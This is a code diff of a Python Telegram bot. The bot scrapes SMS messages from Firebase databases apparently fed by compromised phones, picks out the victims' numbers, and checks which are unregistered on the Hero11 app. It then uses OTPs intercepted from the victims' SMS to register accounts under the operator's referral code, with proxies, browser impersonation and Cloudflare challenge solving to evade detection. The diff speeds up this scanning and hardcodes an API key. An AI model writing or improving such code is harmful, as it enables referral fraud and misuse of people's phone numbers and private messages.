@@ -33,7 +33,8 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "8337013809"))
 SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "RqHPFHbQCNwItxqfh21kDmH0Sx2bR0dBdDH1P9QLuFU6hspmbsQIYzxZ5DOURVbg").strip()
 OTP_TIMEOUT = 25
 POLL_INTERVAL = 2
-TIMEOUT = 30
+TIMEOUT = 20
+SCAN_CHECK_TIMEOUT = 10
 BATCH_SIZE = 5
 TARGET_REGISTRATIONS = 2
 
@@ -204,7 +205,11 @@ def extract_all_phones(messages_dict):
     ordered_phones = []
     seen = set()
 
-    items = messages_dict.values() if isinstance(messages_dict, dict) else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
+    items = (
+        messages_dict.values()
+        if isinstance(messages_dict, dict)
+        else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
+    )
     for item in items:
         if isinstance(item, dict):
             priority_parts = [
@@ -226,26 +231,6 @@ def extract_all_phones(messages_dict):
                     ordered_phones.append(match)
 
     return ordered_phones
-
-def message_has_otp_pattern(msg_val) -> bool:
-    """Checks if a single message entry contains any OTP message/code pattern."""
-    if not isinstance(msg_val, dict):
-        return False
-    body = str(msg_val.get("body") or msg_val.get("message") or msg_val.get("msg") or "")
-    if not body.strip():
-        return False
-
-    has_keyword = bool(re.search(r'\b(?:otp|one[\s-]*time[\s-]*password|verification[\s-]*code|passcode|auth[\s-]*code)\b', body, re.IGNORECASE))
-    codes = re.findall(r'\b\d{4,8}\b', body)
-    filtered_codes = [c for c in codes if c not in {"0000", "1234", "000000", "123456", "111111", "999999", "00000000"}]
-
-    if has_keyword and filtered_codes:
-        return True
-    if len(filtered_codes) >= 1 and re.search(r'\b(?:code|pin|otp|valid|verify|verification)\b', body, re.IGNORECASE):
-        return True
-    if any(len(c) == 6 for c in filtered_codes):
-        return True
-    return False
 
 PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
 
@@ -355,32 +340,6 @@ def extract_raw_time(m_val):
                 break
     return raw_time
 
-def message_age_seconds(m_val, msg_key: str = "", now_ist: datetime = None):
-    if now_ist is None:
-        now_ist = datetime.now(IST)
-    raw_time = extract_raw_time(m_val)
-    dt = resolve_message_dt(raw_time, msg_key=msg_key, ref_now=now_ist)
-    if dt is None:
-        return None
-    diff = (now_ist - dt).total_seconds()
-    if diff < -120:
-        return None
-    return max(0, int(diff))
-
-def has_otp_within_window(msgs, window_minutes: int) -> bool:
-    if not isinstance(msgs, dict) or not msgs:
-        return False
-    now_ist = datetime.now(IST)
-    max_age_sec = window_minutes * 60
-
-    for m_key, m_val in msgs.items():
-        if not message_has_otp_pattern(m_val):
-            continue
-        age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
-        if age_sec is not None and age_sec <= max_age_sec:
-            return True
-    return False
-
 def format_relative_time(time_val, msg_key: str = "", idx: int = 0):
     now_ist = datetime.now(IST)
     dt = resolve_message_dt(time_val, msg_key=msg_key, ref_now=now_ist)
@@ -403,7 +362,7 @@ def format_relative_time(time_val, msg_key: str = "", idx: int = 0):
 class AsyncHero11Client:
     BASE_URL = "https://hero11-in.hero11apex.com"
     
-    def __init__(self, phone: str, invite_code: str):
+    def __init__(self, phone: str, invite_code: str, fast_check: bool = False):
         self.phone = re.sub(r'[^0-9+]', '', str(phone))
         if not self.phone.startswith('+'):
             digits = re.sub(r'[^0-9]', '', self.phone)
@@ -414,6 +373,7 @@ class AsyncHero11Client:
         
         self.invite_code = invite_code
         self.device_id = uuid.uuid4().hex
+        self.fast_check = fast_check
         self.proxy = get_unique_proxy()
         self.session = AsyncSession(proxy=self.proxy) if self.proxy else AsyncSession()
         self.access_token = None
@@ -426,8 +386,9 @@ class AsyncHero11Client:
         except Exception:
             pass
 
-    async def _request(self, method, path, data=None):
+    async def _request(self, method, path, data=None, req_timeout: int = None):
         url = self.BASE_URL + path
+        effective_timeout = req_timeout or TIMEOUT
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
             "Accept": "application/json, text/plain, */*",
@@ -451,9 +412,13 @@ class AsyncHero11Client:
 
         try:
             response = await self.session.request(
-                method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
+                method, url, json=data, headers=headers, impersonate="chrome", timeout=effective_timeout
             )
-            if response.status_code in [403, 503] or "cf-chl" in response.text.lower() or "cloudflare" in response.text.lower():
+            if not self.fast_check and (
+                response.status_code in [403, 503]
+                or "cf-chl" in response.text.lower()
+                or "cloudflare" in response.text.lower()
+            ):
                 solved_token = await solve_cloudflare_turnstile(url, "0x4AAAAAAA...", self.proxy)
                 if solved_token:
                     self.cf_token = solved_token
@@ -461,7 +426,7 @@ class AsyncHero11Client:
                     if isinstance(data, dict):
                         data["cfToken"] = solved_token
                     response = await self.session.request(
-                        method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
+                        method, url, json=data, headers=headers, impersonate="chrome", timeout=effective_timeout
                     )
 
             if response.status_code >= 400:
@@ -495,8 +460,17 @@ class AsyncHero11Client:
             "loginType": 1,
             "phoneCountryCode": "+91"
         }
-        await asyncio.sleep(random.uniform(0.8, 1.5))
-        result = await self._request("POST", "/services/user/auth/v1/blackCheck", data=payload)
+        if self.fast_check:
+            await asyncio.sleep(random.uniform(0.1, 0.25))
+        else:
+            await asyncio.sleep(random.uniform(0.8, 1.5))
+
+        result = await self._request(
+            "POST",
+            "/services/user/auth/v1/blackCheck",
+            data=payload,
+            req_timeout=SCAN_CHECK_TIMEOUT if self.fast_check else TIMEOUT,
+        )
         if result and "data" in result and isinstance(result.get("data"), dict):
             if result["data"].get("isNew") == 2:
                 return "SKIP_EXISTS"
@@ -554,20 +528,24 @@ class AsyncHero11Client:
             return "SUCCESS"
         return "INVALID"
 
-async def is_number_unregistered(full_phone: str, invite_code: str, reg_cache: dict) -> bool:
-    """Returns True if full_phone is unregistered on Hero11, caching results for speed."""
-    if full_phone in reg_cache:
-        return reg_cache[full_phone]
-    client = AsyncHero11Client(full_phone, invite_code)
-    try:
-        res = await client.black_check()
-        is_unreg = res != "SKIP_EXISTS"
-        reg_cache[full_phone] = is_unreg
-        return is_unreg
-    except Exception:
-        return False
-    finally:
-        await client.close()
+async def check_numbers_parallel(phones_list: list, invite_code: str, reg_cache: dict, concurrency: int = 20):
+    """Checks registration status for multiple +91 numbers concurrently."""
+    sem = asyncio.Semaphore(concurrency)
+    to_check = [p for p in dict.fromkeys(phones_list) if p not in reg_cache]
+
+    async def _one(full_phone: str):
+        async with sem:
+            client = AsyncHero11Client(full_phone, invite_code, fast_check=True)
+            try:
+                res = await client.black_check()
+                reg_cache[full_phone] = (res != "SKIP_EXISTS")
+            except Exception:
+                reg_cache[full_phone] = False
+            finally:
+                await client.close()
+
+    if to_check:
+        await asyncio.gather(*(_one(p) for p in to_check))
 
 async def collect_grouped_unregistered_devices(
     firebase_dbs: list,
@@ -576,87 +554,102 @@ async def collect_grouped_unregistered_devices(
     skipped_cids: set = None,
     skipped_phones: set = None,
     used_phones: set = None,
-    window_minutes: int = None,
-    limit: int = 30,
+    limit: int = 25,
 ):
     """
-    Scans online devices ONLY (`status == True`) and returns a list of dicts grouped per unique device ID (`cid`)
-    containing ONLY unregistered numbers.
+    Fast parallel scanner for ALL online devices (`status == True`) grouped per unique device ID (`cid`)
+    containing ONLY unregistered numbers (no time-window filtering).
     """
     import aiohttp
     skipped_cids = skipped_cids or set()
     skipped_phones = skipped_phones or set()
     used_phones = used_phones or set()
-    now_ist = datetime.now(IST)
-    max_age_sec = (window_minutes * 60) if window_minutes is not None else None
 
-    grouped_results = []
+    fetch_sem = asyncio.Semaphore(30)
     seen_device_keys = set()
 
-    async with aiohttp.ClientSession() as session:
-        for fb_url in firebase_dbs:
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50)) as session:
+        async def fetch_db_clients(fb_url: str):
             db_panel_name = fb_url.split('//')[1].split('.')[0]
             db_short_id = db_panel_name[:8]
             try:
-                async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                async with session.get(f"{fb_url}clients.json", timeout=6) as r:
                     clients_data = await r.json() or {}
-
-                for cid, cdata in clients_data.items():
-                    if cid in skipped_cids:
-                        continue
-                    device_key = f"{db_short_id}:{cid}"
-                    if device_key in seen_device_keys:
-                        continue
-
-                    # Strictly online devices only
-                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                        try:
-                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}', timeout=6) as m_req:
-                                msgs = await m_req.json()
-                                if not isinstance(msgs, dict) or not msgs:
-                                    continue
-
-                                if window_minutes is not None and not has_otp_within_window(msgs, window_minutes):
-                                    skipped_cids.add(cid)
-                                    continue
-
-                                raw_phones = extract_all_phones(msgs)
-                                unreg_phones = []
-                                for p in raw_phones:
-                                    full_phone = "+91" + p
-                                    if full_phone in skipped_phones or full_phone in used_phones:
-                                        continue
-                                    if await is_number_unregistered(full_phone, invite_code, reg_cache):
-                                        unreg_phones.append(full_phone)
-                                    else:
-                                        skipped_phones.add(full_phone)
-
-                                if not unreg_phones:
-                                    skipped_cids.add(cid)
-                                    continue
-
-                                ages = []
-                                for m_key, m_val in msgs.items():
-                                    if isinstance(m_val, dict):
-                                        age = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
-                                        if age is not None:
-                                            if max_age_sec is None or age <= max_age_sec:
-                                                ages.append(age)
-
-                                seen_device_keys.add(device_key)
-                                grouped_results.append({
-                                    "firebase_url": fb_url,
-                                    "db_panel_name": db_panel_name,
-                                    "db_short_id": db_short_id,
-                                    "cid": cid,
-                                    "msgs": msgs,
-                                    "unreg_phones": unreg_phones,
-                                    "min_age_sec": min(ages) if ages else None,
-                                })
-                        except Exception:
-                            pass
             except Exception:
-                pass
+                return []
+            out = []
+            for cid, cdata in clients_data.items():
+                if cid in skipped_cids:
+                    continue
+                device_key = f"{db_short_id}:{cid}"
+                if device_key in seen_device_keys:
+                    continue
+                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                    seen_device_keys.add(device_key)
+                    out.append((fb_url, db_panel_name, db_short_id, cid))
+            return out
+
+        db_batches = await asyncio.gather(*(fetch_db_clients(u) for u in firebase_dbs))
+        online_targets = [item for sub in db_batches for item in sub]
+
+        async def fetch_one_device(fb_url: str, db_panel_name: str, db_short_id: str, cid: str):
+            async with fetch_sem:
+                try:
+                    async with session.get(
+                        f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}',
+                        timeout=5,
+                    ) as m_req:
+                        msgs = await m_req.json()
+                    if not isinstance(msgs, dict) or not msgs:
+                        return None
+
+                    phones = [
+                        "+91" + p
+                        for p in extract_all_phones(msgs)
+                        if ("+91" + p) not in skipped_phones and ("+91" + p) not in used_phones
+                    ]
+                    if not phones:
+                        skipped_cids.add(cid)
+                        return None
+
+                    return {
+                        "firebase_url": fb_url,
+                        "db_panel_name": db_panel_name,
+                        "db_short_id": db_short_id,
+                        "cid": cid,
+                        "msgs": msgs,
+                        "candidate_phones": phones,
+                    }
+                except Exception:
+                    return None
+
+        fetched = await asyncio.gather(*(fetch_one_device(*t) for t in online_targets))
+        raw_device_entries = [d for d in fetched if d is not None]
+
+    all_phones_to_check = [p for d in raw_device_entries for p in d["candidate_phones"]]
+    await check_numbers_parallel(all_phones_to_check, invite_code, reg_cache, concurrency=20)
+
+    grouped_results = []
+    for d in raw_device_entries:
+        unreg_phones = []
+        for full_phone in d["candidate_phones"]:
+            if reg_cache.get(full_phone):
+                unreg_phones.append(full_phone)
+            else:
+                skipped_phones.add(full_phone)
+
+        if not unreg_phones:
+            skipped_cids.add(d["cid"])
+            continue
+
+        grouped_results.append({
+            "firebase_url": d["firebase_url"],
+            "db_panel_name": d["db_panel_name"],
+            "db_short_id": d["db_short_id"],
+            "cid": d["cid"],
+            "msgs": d["msgs"],
+            "unreg_phones": unreg_phones,
+        })
 
     return grouped_results
 
@@ -677,21 +670,14 @@ def get_main_menu():
          InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
         [InlineKeyboardButton(text="📊 Check Number Status", callback_data="check_numbers_menu"),
          InlineKeyboardButton(text="🔢 Scan All Numbers by ID", callback_data="scan_id_numbers_menu")],
-        [InlineKeyboardButton(text="💬 History (< 10m)", callback_data="hist_win_10"),
-         InlineKeyboardButton(text="💬 History (< 1h)", callback_data="hist_win_60"),
-         InlineKeyboardButton(text="💬 History (< 24h)", callback_data="hist_win_1440")],
         [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
          InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
-        [InlineKeyboardButton(text="⚡ Batch 5 (OTP < 10m)", callback_data="start_auto_10"),
-         InlineKeyboardButton(text="⚡ Batch 5 (OTP < 1h)", callback_data="start_auto_60")],
-        [InlineKeyboardButton(text="⚡ Batch 5 (OTP < 24h)", callback_data="start_auto_1440")]
+        [InlineKeyboardButton(text="⚡ Start Batch 5 Automation", callback_data="start_batch_all")]
     ])
 
 class BatchBoardLogger:
-    """Renders a live Telegram batch status board matching the 5-slot concurrent progress layout."""
-    def __init__(self, message: types.Message, window_label: str):
+    def __init__(self, message: types.Message):
         self.message = message
-        self.window_label = window_label
         self.last_update = 0
         self.last_text = ""
 
@@ -712,10 +698,10 @@ class BatchBoardLogger:
                 f"<code>[{idx:02d}] …{html.escape(last4)} ({html.escape(short_cid)})</code>  {s['status']}"
             )
 
-        rows_text = "\n".join(rows) if rows else "<i>Scanning unregistered online devices...</i>"
+        rows_text = "\n".join(rows) if rows else "<i>Scanning all unregistered online devices...</i>"
         board = (
             f"⚡ <b>HERO11 AUTO BATCH REGISTRATION (BATCH #{batch_num})</b>\n\n"
-            f"💎 <b>Panel:</b> <code>{html.escape(panel_name)}</code> ({html.escape(self.window_label)})\n"
+            f"💎 <b>Panel:</b> <code>{html.escape(panel_name)}</code> (All Online Unregistered)\n"
             f"📊 <b>Batch Progress:</b> {done_count}/{len(slots)} (🟢 {ok_count} | 🔴 {fail_count}) • <b>Total:</b> {success_count}/{total_needed}\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"<b>DEVICE / MOBILE</b>  |  <b>STATUS</b>\n"
@@ -743,7 +729,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> 5 concurrent unregistered online devices (Cap: 2 OTPs)\n\n"
+        f"⚙️ <b>Batch Mode:</b> All online unregistered devices (5 concurrent, Cap: 2 OTPs)\n\n"
         "Select an option below:"
     )
     await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -882,7 +868,7 @@ async def process_check_numbers_input(message: types.Message, state: FSMContext)
         digits = re.sub(r'[^0-9]', '', line)
         if len(digits) >= 10:
             phone_num = "+91" + digits[-10:]
-            client = AsyncHero11Client(phone_num, default_code)
+            client = AsyncHero11Client(phone_num, default_code, fast_check=True)
             try:
                 check_res = await client.black_check()
                 if check_res == "SKIP_EXISTS":
@@ -936,6 +922,7 @@ async def process_device_id_scan(message: types.Message, state: FSMContext):
         import aiohttp
         default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
         report_blocks = []
+        reg_cache = {}
 
         async with aiohttp.ClientSession() as session:
             for fb_url in USER_DATA["firebase_dbs"]:
@@ -951,24 +938,26 @@ async def process_device_id_scan(message: types.Message, state: FSMContext):
                     else:
                         cids_to_check = list(target_cids)
 
+                    id_phone_map = {}
+                    all_phones = []
                     for cid in cids_to_check:
                         async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=25', timeout=6) as m_req:
                             msgs = await m_req.json()
-                            phones = extract_all_phones(msgs)
-                            if phones:
-                                num_lines = []
-                                for p in phones:
-                                    full_phone = "+91" + p
-                                    client = AsyncHero11Client(full_phone, default_code)
-                                    try:
-                                        res = await client.black_check()
-                                    finally:
-                                        await client.close()
-                                    badge = "🔴 Registered" if res == "SKIP_EXISTS" else "🟢 Unregistered"
-                                    num_lines.append(f"  • <code>{html.escape(full_phone)}</code> — {badge}")
-                                report_blocks.append(
-                                    f"🆔 <b>ID:</b> <code>{html.escape(cid)}</code> (DB: {html.escape(db_short_id)})\n" + "\n".join(num_lines)
-                                )
+                            phones = ["+91" + p for p in extract_all_phones(msgs)]
+                            id_phone_map[cid] = phones
+                            all_phones.extend(phones)
+
+                    await check_numbers_parallel(all_phones, default_code, reg_cache, concurrency=20)
+
+                    for cid, phones in id_phone_map.items():
+                        if phones:
+                            num_lines = []
+                            for full_phone in phones:
+                                badge = "🟢 Unregistered" if reg_cache.get(full_phone) else "🔴 Registered"
+                                num_lines.append(f"  • <code>{html.escape(full_phone)}</code> — {badge}")
+                            report_blocks.append(
+                                f"🆔 <b>ID:</b> <code>{html.escape(cid)}</code> (DB: {html.escape(db_short_id)})\n" + "\n".join(num_lines)
+                            )
                 except Exception:
                     pass
 
@@ -986,94 +975,6 @@ async def process_device_id_scan(message: types.Message, state: FSMContext):
     except Exception as e:
         await status_msg.edit_text(f"❌ Error scanning Device ID(s): {html.escape(str(e))}", reply_markup=get_main_menu())
 
-@dp.callback_query(F.data.startswith("hist_win_"))
-async def cb_show_history_by_window(callback: types.CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        return
-    if not USER_DATA["firebase_dbs"]:
-        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
-        return
-
-    try:
-        window_minutes = int(callback.data.split("_")[-1])
-    except Exception:
-        window_minutes = 10
-
-    labels = {10: "under 10 min", 60: "under 1 hr", 1440: "under 24 hr"}
-    win_label = labels.get(window_minutes, f"under {window_minutes}m")
-    max_age_sec = window_minutes * 60
-    now_ist = datetime.now(IST)
-    default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
-
-    status_msg = await callback.message.answer(
-        f"🔍 Grouping unregistered online IDs & filtering chat history <b>{html.escape(win_label)}</b>...",
-        parse_mode="HTML"
-    )
-
-    try:
-        reg_cache = {}
-        grouped = await collect_grouped_unregistered_devices(
-            firebase_dbs=USER_DATA["firebase_dbs"],
-            invite_code=default_code,
-            reg_cache=reg_cache,
-            window_minutes=None,
-            limit=20,
-        )
-
-        id_blocks = []
-        for dev in grouped:
-            msgs = dev["msgs"]
-            cid = dev["cid"]
-            db_short_id = dev["db_short_id"]
-            unreg_list_str = ", ".join(dev["unreg_phones"])
-
-            recent_lines = []
-            for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
-                if not isinstance(m_val, dict):
-                    continue
-                age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
-                if age_sec is None or age_sec > max_age_sec:
-                    continue
-
-                time_ago = format_relative_time(extract_raw_time(m_val), msg_key=m_key, idx=idx)
-                body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
-                sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")
-
-                otps = re.findall(r'\b\d{6}\b', body_str)
-                valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
-                otp_badge = f" 🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""
-
-                recent_lines.append(
-                    f"  • [{html.escape(time_ago)}] <b>{html.escape(sender_str)}</b>{otp_badge}: {html.escape(body_str[:140])}"
-                )
-
-            if recent_lines:
-                id_blocks.append(
-                    f"🆔 <code>{html.escape(cid)}</code> [{html.escape(db_short_id)}]\n"
-                    f"📱 <code>{html.escape(unreg_list_str)}</code>\n"
-                    + "\n".join(recent_lines[:5])
-                )
-
-        if not id_blocks:
-            await status_msg.edit_text(
-                f"ℹ️ No chat history messages found for <b>unregistered online numbers</b> <b>{html.escape(win_label)}</b>.",
-                parse_mode="HTML",
-                reply_markup=get_main_menu()
-            )
-        else:
-            block = "\n\n".join(id_blocks[:8])
-            if len(block) > 3800:
-                block = block[:3800] + "\n\n<i>[Truncated]</i>"
-            await status_msg.edit_text(
-                f"💬 <b>UNREGISTERED ONLINE CHAT HISTORY ({html.escape(win_label.upper())}) — {len(id_blocks)} ID(s)</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n\n{block}",
-                parse_mode="HTML",
-                reply_markup=get_main_menu()
-            )
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Error loading chat history: {html.escape(str(e))}", reply_markup=get_main_menu())
-    await callback.answer()
-
 @dp.callback_query(F.data == "view_active_sms")
 async def cb_view_active_sms(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -1082,7 +983,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
         return
 
-    status_msg = await callback.message.answer("🔍 Scanning all online unregistered numbers grouped by ID...")
+    status_msg = await callback.message.answer("⚡ Fast-scanning all online unregistered numbers grouped by ID...")
 
     try:
         active_devices = []
@@ -1208,7 +1109,7 @@ async def cb_back_to_main(callback: types.CallbackQuery):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> 5 concurrent unregistered online devices (Cap: 2 OTPs)\n\n"
+        f"⚙️ <b>Batch Mode:</b> All online unregistered devices (5 concurrent, Cap: 2 OTPs)\n\n"
         "Select an option below:"
     )
     await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1257,7 +1158,7 @@ async def cb_stop_automation(callback: types.CallbackQuery):
     await callback.message.answer("🛑 <b>Batch Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
-@dp.callback_query(F.data.startswith("start_auto_"))
+@dp.callback_query(F.data == "start_batch_all")
 async def cb_start_automation(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
@@ -1268,22 +1169,10 @@ async def cb_start_automation(callback: types.CallbackQuery):
         await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
         return
 
-    try:
-        window_minutes = int(callback.data.split("_")[-1])
-    except Exception:
-        window_minutes = 10
-
-    window_labels = {
-        10: "last 10 min",
-        60: "past 1 hr",
-        1440: "last 24 hrs",
-    }
-    window_label = window_labels.get(window_minutes, f"last {window_minutes}m")
-
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
-        f"⚡ <b>Batch Scan Started ({html.escape(window_label)})!</b>\n"
-        f"Scanning unregistered online devices (5 per batch, max {TARGET_REGISTRATIONS} OTPs)...",
+        f"⚡ <b>Fast Batch Scan Started!</b>\n"
+        f"Scanning all online unregistered devices in parallel (5 per batch, max {TARGET_REGISTRATIONS} OTPs)...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
@@ -1300,7 +1189,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         skipped_cids = set()
         reg_cache = {}
         batch_num = 0
-        board = BatchBoardLogger(status_msg, window_label)
+        board = BatchBoardLogger(status_msg)
 
         try:
             while success_count < total_needed and USER_DATA["is_running"]:
@@ -1311,11 +1200,9 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     skipped_cids=skipped_cids,
                     skipped_phones=skipped_phones,
                     used_phones=used_phones,
-                    window_minutes=window_minutes,
-                    limit=50,
+                    limit=25,
                 )
 
-                # Pick up to 5 unregistered online device candidates for this batch
                 batch_candidates = []
                 for dev in grouped:
                     for full_phone in dev["unreg_phones"]:
@@ -1334,11 +1221,11 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
                 if not batch_candidates:
                     await status_msg.edit_text(
-                        f"🔴 <b>No unregistered online devices found ({html.escape(window_label)}).</b>\nRetrying in 5s...",
+                        "🔴 <b>No unregistered online devices found.</b>\nRetrying in 3s...",
                         parse_mode="HTML",
                         reply_markup=get_main_menu()
                     )
-                    await asyncio.sleep(5)
+                    await asyncio.sleep(3)
                     continue
 
                 batch_num += 1
@@ -1373,7 +1260,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         slot["done"] = True
                         return
 
-                    # Snapshot existing message keys before requesting OTP
                     known_keys = set()
                     try:
                         async with aiohttp.ClientSession() as session:
@@ -1384,7 +1270,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     except Exception:
                         pass
 
-                    client = AsyncHero11Client(phone, current_code)
+                    client = AsyncHero11Client(phone, current_code, fast_check=False)
                     try:
                         send_status = await client.send_otp()
                         if cap_reached_event.is_set():
@@ -1429,7 +1315,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             except Exception:
                                 pass
 
-                        # If 2 OTPs already succeeded in this batch, ignore the 3rd/4th/5th immediately
                         if cap_reached_event.is_set():
                             skipped_phones.add(phone)
                             slot["status"] = "⏭️ Ignored (Cap 2/2)"
@@ -1444,7 +1329,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             await board.render(panel_name, batch_num, success_count, total_needed, slots)
                             return
 
-                        # Claim one of the 2 allowed OTP slots atomically before verifying
                         async with state_lock:
                             if success_count >= total_needed or cap_reached_event.is_set():
                                 cap_reached_event.set()
@@ -1493,12 +1377,11 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     finally:
                         await client.close()
 
-                # Launch all 5 slots concurrently
                 await asyncio.gather(*(process_slot(i) for i in range(len(slots))))
                 await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
 
                 if success_count < total_needed and USER_DATA["is_running"]:
-                    await asyncio.sleep(2.5)
+                    await asyncio.sleep(1.5)
 
             USER_DATA["is_running"] = False
             if success_count >= total_needed:
@@ -1506,7 +1389,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 final_msg = (
                     f"🎉 <b>HERO11 BATCH REGISTRATION COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"⏱️ <b>Filter Window:</b> OTP in {html.escape(window_label)}\n"
                     f"📦 <b>Batches Run:</b> {batch_num} (5 concurrent/batch)\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
                     f"📱 <b>Registered Numbers & Device IDs:</b>\n{numbers_list_str}\n"
